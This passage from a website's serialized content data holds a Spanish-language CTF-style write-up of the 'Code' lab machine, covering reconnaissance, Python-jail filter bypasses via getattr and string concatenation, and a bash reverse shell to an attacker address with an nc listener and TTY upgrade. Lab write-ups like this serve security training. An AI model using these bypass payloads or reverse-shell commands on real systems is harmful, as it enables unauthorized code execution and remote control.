comando anterior:\n\n```bash\nnc -lnvp 443\n```\nAl ejecutar el código en el servicio web, este establece una conexión de retorno hacia nuestra máquina atacante, otorgándonos una **shell inversa**. Este tipo de acceso nos permite interactuar directamente con el sistema objetivo como si estuviéramos trabajando desde su propia terminal, posibilitando la ejecución de comandos, la navegación por el sistema de archivos y la recolección de información sensible en tiempo real.\n\n\n[![Ejecucion del código en el servicio web para obtener una shell inversa](/code/payload3.png)](/code/payload3.png)\n\nSeguidamente, se procede a realizar un tratamiento de la **TTY** con el fin de mejorar la interacción con la sesión obtenida. Este proceso incluye la configuración de una terminal completamente funcional que soporte caracterı́sticas como edición de lı́nea, autocompletado y manejo de señales. De esta manera, al presionar combinaciones de teclas como **Ctrl + C**, la conexión no se interrumpe y se mantiene la estabilidad de la sesión.\n\n```bash\n# En la shell inversa obtenida, ejecutar:\npython3 -c ’import pty; pty.spawn(\"/bin/bash\")’\nCtrl+Z # Presionar las teclas\nstty raw -echo; fg\nreset xterm\nexport TERM=xterm\n```","src/content/writeups/code.md","84cc90a025d64fca",{"html":124,"metadata":125},"\u003Ch3 id=\"descripción\">Descripción\u003C/h3>\n\u003Cp>Code es una máquina Linux sencilla que cuenta con una aplicación web Python Code Editor vulnerable a la ejecución remota de código mediante un bypass de Python Jail. Después de obtener acceso como usuario de producción de la aplicación, se pueden encontrar credenciales descifrables en un archivo de base de datos sqlite3. Con estas credenciales, se obtiene acceso a otro usuario, martin , que tiene permisos sudo para un script de utilidad de respaldo, backy.sh . Este script incluye una sección de código vulnerable que, cuando se explota, nos permite escalar nuestros privilegios creando una copia de la carpeta raı́z.\u003C/p>\n\u003Ch3 id=\"objetivos\">Objetivos\u003C/h3>\n\u003Ch4 id=\"objetivo-general\">Objetivo general\u003C/h4>\n\u003Cp>Desarrollar habilidades de análisis y explotación en entornos restringidos de ejecución de código en Python (Python Jail), con el fin de fortalecer el conocimiento sobre vulnerabilidades, evasión de filtros y seguridad en aplicaciones que ejecutan código dinámico.. Como es el caso de la Máquina Code.\u003C/p>\n\u003Ch4 id=\"objetivos-especificos\">Objetivos Especificos\u003C/h4>\n\u003Cul>\n\u003Cli>Comprender el funcionamiento interno del lenguaje Python, incluyendo introspección, objetos y estructuras dinámicas como builtins , getattr, eval y exec.\u003C/li>\n\u003Cli>Identificar y evadir mecanismos de restricción artificial (filtros, listas negras, entornos limitados) impuestos en un entorno tipo jail.\u003C/li>\n\u003Cli>Aplicar técnicas ofensivas de bypass, como reconstrucción de funciones prohibidas, manipulación de clases y uso de expresiones indirectas para ejecutar código arbitrario.\u003C/li>\n\u003Cli>Evaluar los riesgos de seguridad asociados con la ejecución de código Python no controlado, como el uso inseguro de eval, input o exec en aplicaciones web o automatizadas.\u003Cbr>\u003C/li>\n\u003C/ul>\n\u003Ch3 id=\"analisis-de-vulnerabilidades\">Analisis de Vulnerabilidades\u003C/h3>\n\u003Ch4 id=\"reconocimiento-inicial\">Reconocimiento Inicial\u003C/h4>\n\u003Cp>Se comenzó realizando un análisis inicial sobre el sistema, cuyo objetivo principal fue comprobar la disponibilidad y accesibilidad del equipo o servicio objetivo desde el segmento de red en el que se estaba operando. Esta verificación resultó fundamental para asegurar que la comunicación entre el host atacante y el sistema de destino fuera posible antes de iniciar fases más avanzadas de la evaluación. Para llevar a cabo esta tarea de reconocimiento preliminar, se emplearon herramientas de terminal ampliamente utilizadas en auditorı́as de seguridad:\u003C/p>\n\u003Cp>\u003Cstrong>Ping\u003C/strong>, para enviar solicitudes ICMP al host y confirmar su capacidad de respuesta, además de obtener información básica como ser el tipo de sistema operativo ya sea Windows o Linux mediante el \u003Cstrong>TTL\u003C/strong>.\u003C/p>\n\u003Cp>\u003Ca href=\"/code/ping.png\">\u003Cimg src=\"/code/ping.png\" alt=\"Ejecución del comando ping\">\u003C/a>\u003C/p>\n\u003Cp>\u003Cstrong>Nmap\u003C/strong>, para efectuar un escaneo de puertos y servicios disponibles, identificando posibles puntos de entrada o servicios expuestos que pudieran ser analizados en etapas posteriores.\u003C/p>\n\u003Cp>\u003Ca href=\"/code/nmap.png\">\u003Cimg src=\"/code/nmap.png\" alt=\"Ejecución del comando ping\">\u003C/a>\u003C/p>\n\u003Cp>Este proceso inicial permitió obtener una visión general del estado de la red y del sistema objetivo, sirviendo como base para definir la estrategia y priorizar las acciones en las siguientes fases de la evaluación.\u003C/p>\n\u003Ch3 id=\"analisis-de-los-servicios-activos\">Analisis de los servicios activos\u003C/h3>\n\u003Cp>Seguidamente, una vez identificados los servicios activos en el sistema objetivo en este caso, el puerto 22/TCP, correspondiente al servicio SSH (Secure Shell), y el puerto 5000/TCP, que aloja un servicio web se procede a realizar un escaneo más exhaustivo y especı́fico sobre cada uno de ellos.\u003C/p>\n\u003Ch4 id=\"puerto-22-ssh\">Puerto 22 (SSH)\u003C/h4>\n\u003Cp>El hecho de que el puerto 22/TCP se encuentre activo indica que el sistema dispone de un servicio SSH (Secure Shell) en ejecución, lo que permite establecer una conexión remota segura mediante el uso de protocolos de cifrado para la transmisión de datos. Este servicio, comúnmente utilizado para la administración de servidores y dispositivos de red, brinda acceso a una lı́nea de comandos del sistema de destino, desde la cual es posible ejecutar comandos y realizar tareas de gestión.\u003C/p>\n\u003Cp>La presencia de SSH implica que, si se dispone de credenciales válidas o se logra explotar alguna vulnerabilidad en su configuración o implementación, un atacante podrı́a obtener control remoto sobre el sistema. Por este motivo, resulta fundamental identificar la versión exacta del servicio, verificar la fortaleza de los mecanismos de autenticación implementados y evaluar la existencia de vulnerabilidades conocidas asociadas a esa versión especı́fica.\u003C/p>\n\u003Cp>En el contexto de una evaluación de seguridad, este hallazgo se considera un punto de interés clave, ya que un servicio SSH mal configurado o desactualizado puede convertirse en una puerta de entrada directa al sistema.\u003C/p>\n\u003Cp>El analisis demuestra que este servicio se esta ejecutando en un sistema operativo ubuntu como se muestra en la\nsiguiente imagen:\u003C/p>\n\u003Cp>\u003Ca href=\"/code/ssh.png\">\u003Cimg src=\"/code/ssh.png\" alt=\"Servicio de SSH (Secure Shell)\">\u003C/a>\u003C/p>\n\u003Ch4 id=\"puerto-5000-servicio-web\">Puerto 5000 (Servicio Web)\u003C/h4>\n\u003Cp>Al ejecutar el comando \u003Cstrong>whatweb\u003C/strong> desde la terminal, se obtiene información detallada acerca de las tecnologı́as y frameworks que utiliza el servicio web en el puerto correspondiente. El resultado de este análisis revela que el servicio está siendo ejecutado mediante \u003Cstrong>Gunicorn 20.0.4\u003C/strong>.\u003C/p>\n\u003Cp>\u003Cstrong>Gunicorn\u003C/strong> (Green Unicorn) es un servidor WSGI para aplicaciones Python ampliamente utilizado en entornos de producción debido a su simplicidad y eficiencia. La identificación de su versión especı́fica, en este caso \u003Cstrong>20.0.4\u003C/strong>, resulta relevante ya que permite verificar si existen vulnerabilidades conocidas o configuraciones inseguras asociadas a dicha versión. Este tipo de información es fundamental para orientar fases posteriores de análisis, como la búsqueda en bases de datos de vulnerabilidades (por ejemplo, CVE o Exploit-DB) y la evaluación de posibles vectores de ataque contra el servicio.\u003C/p>\n\u003Cp>\u003Ca href=\"/code/port5000.png\">\u003Cimg src=\"/code/port5000.png\" alt=\"Servicio web puerto 5000 (Gunicorn)\">\u003C/a>\u003C/p>\n\u003Cp>Al acceder al servicio web mediante un navegador utilizando la URL \u003Ca href=\"http://10.10.11.62:5000\">http://10.10.11.62:5000\u003C/a>, se observa que el sistema está ejecutando un editor de código para el lenguaje de programación Python. Esta interfaz permite al usuario escribir y ejecutar código Python directamente desde el navegador, lo cual facilita la interacción y el desarrollo rápido dentro del entorno proporcionado.\u003C/p>\n\u003Cp>Si bien esta funcionalidad puede resultar muy útil en contextos controlados y para propósitos legı́timos, también implica un nivel considerable de riesgo desde la perspectiva de seguridad. La capacidad de ejecutar código remotamente sin las debidas restricciones o controles puede exponer el sistema a vulnerabilidades crı́ticas, tales como la ejecución arbitraria de código, escalación de privilegios o acceso no autorizado a recursos sensibles.\u003C/p>\n\u003Cp>\u003Ca href=\"/code/webpage.png\">\u003Cimg src=\"/code/webpage.png\" alt=\"Pagina web que corre un editor de código en lı́nea\">\u003C/a>\u003C/p>\n\u003Ch3 id=\"explotación-del-sistema\">Explotación del Sistema\u003C/h3>\n\u003Cp>Dado que podemos ejecutar código directamente desde la página de inicio, no es necesario crear una cuenta, a menos que queramos guardar o realizar un seguimiento de nuestro trabajo. Primero intentaremos cargar algunos módulos comunes, como import, os, write u open, ya que son fundamentales para ejecutar cargas útiles que interactúan con el sistema subyacente. Sin embargo, veremos inmediatamente que hay un filtro para impedirnos utilizar palabras clave restringidas y bloquear el uso de funciones y módulos potencialmente peligrosos.\u003C/p>\n\u003Cp>\u003Ca href=\"/code/payload1.png\">\u003Cimg src=\"/code/payload1.png\" alt=\"Implementación de reglas para impedir el uso de cargas útiles\">\u003C/a>\u003C/p>\n\u003Cp>Dada la presencia de mecanismos de filtrado que restringen la ejecución directa de código en el servicio web, se torna indispensable identificar métodos para eludir estos filtros con el fin de avanzar en la evaluación de seguridad. Para ello, se llevó a cabo una investigación exhaustiva utilizando palabras clave como “python bypass” en motores de búsqueda y bases de datos especializadas.\u003C/p>\n\u003Cp>Como resultado, se localizaron múltiples artı́culos y recursos técnicos que describen diversas técnicas para superar las restricciones impuestas en entornos Python. Estas técnicas incluyen manipulación avanzada de la sintaxis, uso de codificaciones alternativas, construcción dinámica de código y explotación de vulnerabilidades en componentes especı́ficos.\u003C/p>\n\u003Cp>La información recopilada servirá como fundamento para la implementación de pruebas controladas destinadas a validar la efectividad de los filtros y detectar posibles brechas que puedan ser explotadas.\u003C/p>\n\u003Ch4 id=\"uso-de-build-in\">Uso de build-in\u003C/h4>\n\u003Cp>En Python, los built-in (o funciones y objetos incorporados) son un conjunto de funciones, excepciones y tipos de datos que están disponibles de forma inmediata sin necesidad de importar ningún módulo o librerı́a adicional. Estos elementos forman parte del núcleo del lenguaje y proporcionan funcionalidades esenciales para realizar tareas comunes de programación.\u003C/p>\n\u003Ch3 id=\"uso-de-getattr-para-evadir-restricciones-en-python\">Uso de getattr para evadir restricciones en Python\u003C/h3>\n\u003Cp>La función incorporada getattr(objeto, nombre atributo) en Python permite acceder dinámicamente a los atributos o métodos de un objeto usando el nombre del atributo como una cadena. Este comportamiento es especialmente útil para evadir filtros y restricciones que bloquean el acceso directo a funciones o métodos sensibles. En entornos con mecanismos de seguridad que detectan y bloquean llamadas explı́citas a funciones peligrosas (por ejemplo, os.system), getattr puede ser usada para ocultar la intención real del código. Como en el siguiente código:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">test \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> getattr\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.\u003C/span>\u003Cspan style=\"color:#79B8FF\">__self__\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'__im'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'port__'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'o'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 's'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">getattr\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(test, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'sy'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'stem'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)( \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'whoami'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Otro método efectivo para evadir restricciones en entornos Python está explicado en un\n\u003Ca href=\"https://medium.com/soulsecteam/some-simple-bypass-tricks-8f02455b098d\" class=\"text-blue-500 font-bold underline hover:text-blue-700 transition\">\nartículo publicado en Medium\n\u003C/a>. A continuación, se presenta el fragmento de código descrito en dicho artículo:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[w \u003C/span>\u003Cspan style=\"color:#F97583\">for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> w \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">..\u003C/span>\u003Cspan style=\"color:#79B8FF\">__class__\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.__base__.\u003C/span>\u003Cspan style=\"color:#79B8FF\">__subclasses__\u003C/span>\u003Cspan style=\"color:#E1E4E8\">() \u003C/span>\u003Cspan style=\"color:#F97583\">if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> w.\u003C/span>\u003Cspan style=\"color:#79B8FF\">__name__\u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'Quitter'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">][\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">].\u003C/span>\u003Cspan style=\"color:#79B8FF\">__init__\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.\u003C/span>\u003Cspan style=\"color:#79B8FF\">__globals__\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'sy'\u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'s'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">].modules[\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'o'\u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'s'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">].\u003C/span>\u003Cspan style=\"color:#79B8FF\">__dict__\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'sy'\u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'stem'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">](\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'ls'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch4 id=\"ejecución-de-comandos-en-el-sistema\">Ejecución de comandos en el sistema\u003C/h4>\n\u003Cp>Esto nos permitirá ejecutar comandos de shell sin utilizar palabras clave prohibidas como \u003Cstrong>≪import≫\u003C/strong> u \u003Cstrong>≪os≫\u003C/strong> directamente, utilizando la concatenación de cadenas, es decir, \u003Cstrong>≪o≫\u003C/strong> + \u003Cstrong>≪s≫\u003C/strong>. Sin embargo, tras ejecutar el código, no vemos ningún resultado. Esto sugiere que, aunque el código se esté ejecutando en el host, el resultado no se está devolviendo al frontend. Para verificar si se está ejecutando en el host, modificaremos nuestro enfoque e intentaremos redirigir el resultado a nuestra máquina utilizando un sencillo listener con el comando \u003Cstrong>tcpdump\u003C/strong> para capturar la respuesta del comando \u003Cstrong>ping\u003C/strong> ejecutado desde el servicio web.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">test \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> getattr\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.\u003C/span>\u003Cspan style=\"color:#79B8FF\">__self__\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'__im'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'port__'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) (\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'o'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 's'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">getattr\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (test, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'sy'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'stem'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'ping -c 1 10.10.x.x'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Ejecución del código python en la web:\u003C/p>\n\u003Cp>\u003Ca href=\"/code/payload2.png\">\u003Cimg src=\"/code/payload2.png\" alt=\"Código python en la web\">\u003C/a>\u003C/p>\n\u003Cp>Recibimos respuesta por parte del servido al ejecutar el comandon \u003Cstrong>ping\u003C/strong>:\u003C/p>\n\u003Cp>\u003Ca href=\"/code/term1.png\">\u003Cimg src=\"/code/term1.png\" alt=\"Respuesta del comando ping\">\u003C/a>\u003C/p>\n\u003Cp>Seguidamente ejecutaremos el siguiente código en el servicio web para obtener una \u003Cstrong>shell inversa\u003C/strong> mediante \u003Cstrong>Netcat\u003C/strong>:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">test \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> getattr\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.\u003C/span>\u003Cspan style=\"color:#79B8FF\">__self__\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'__im'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'port__'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'o'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 's'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">getattr\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(test, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">'sy'\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> 'stem'\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">'bash -c \"bash -i >&#x26; /dev/tcp/10.10.x.x/443 0>&#x26;1\" '\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Y ejecutamos en nuestra máquina de atacante \u003Cstrong>Netcat\u003C/strong> en el puerto que especificamos en el comando anterior:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">nc\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -lnvp\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 443\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Al ejecutar el código en el servicio web, este establece una conexión de retorno hacia nuestra máquina atacante, otorgándonos una \u003Cstrong>shell inversa\u003C/strong>. Este tipo de acceso nos permite interactuar directamente con el sistema objetivo como si estuviéramos trabajando desde su propia terminal, posibilitando la ejecución de comandos, la navegación por el sistema de archivos y la recolección de información sensible en tiempo real.\u003C/p>\n\u003Cp>\u003Ca href=\"/code/payload3.png\">\u003Cimg src=\"/code/payload3.png\" alt=\"Ejecucion del código en el servicio web para obtener una shell inversa\">\u003C/a>\u003C/p>\n\u003Cp>Seguidamente, se procede a realizar un tratamiento de la \u003Cstrong>TTY\u003C/strong> con el fin de mejorar la interacción con la sesión obtenida. Este proceso incluye la configuración de una terminal completamente funcional que soporte caracterı́sticas como edición de lı́nea, autocompletado y manejo de señales. De esta manera, al presionar combinaciones de teclas como \u003Cstrong>Ctrl + C\u003C/strong>, la conexión no se interrumpe y se mantiene la estabilidad de la sesión.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"bash\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># En la shell inversa obtenida, ejecutar:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">python3\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -c\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> ’import\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> pty\u003C/span>\u003Cspan style=\"color:#E1E4E8\">; \u003C/span>\u003Cspan style=\"color:#B392F0\">pty.spawn(\u003C/span>\u003Cspan style=\"color:#B392F0\">\"/bin/bash\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)’\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">Ctrl+Z\u003C/span>\u003Cspan style=\"color:#6A737D\"> # Presionar las teclas\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">stty\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> raw\u003C/span>\u003Cspan style=\"color:#79B8FF\"> -echo\u003C/span>\u003Cspan style=\"color:#E1E4E8\">; \u003C/span>\u003Cspan style=\"color:#79B8FF\">fg\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">reset\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> xterm\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">export\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> TERM\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\">xterm\u003C/span>\u003C/span>\u003C/code>\u003C/pre>",{"headings":126,"localImagePaths":156,"remoteImagePaths":157,"frontmatter":158,"imagePaths":160},[127,130,131,132,133,134,135,138,141,144,147,150,153],{"depth":35,"slug":128,"text":129},"descripción","Descripción",{"depth":35,"slug":39,"text":40},{"depth":42,"slug":43,"text":44},{"depth":42,"slug":46,"text":47},{"depth":35,"slug":49,"text":50},{"depth":42,"slug":52,"text":53},{"depth":35,"slug":136,"text":137},"analisis-de-los-servicios-activos","Analisis de los servicios activos",{"depth":42,"slug":139,"text":140},"puerto-22-ssh","Puerto 22 (SSH)",{"depth":42,"slug":142,"text":143},"puerto-5000-servicio-web","Puerto 5000 (Servicio Web)",{"depth":35,"slug":145,"text":146},"explotación-del-sistema","Explotación del Sistema",{"depth":42,"slug":148,"text":149},"uso-de-build-in","Uso de build-in",{"depth":35,"slug":151,"text":152},"uso-de-getattr-para-evadir-restricciones-en-python","Uso de getattr para evadir restricciones en Python",{"depth":42,"slug":154,"text":155},"ejecución-de-comandos-en-el-sistema","Ejecución de comandos en el sistema",[],[],{"title":113,"os":15,"dificultad":114,"img":16,"skills":159,"plataforma":17,"description":119},[20,116,23,24,117,118],[],"code.md"]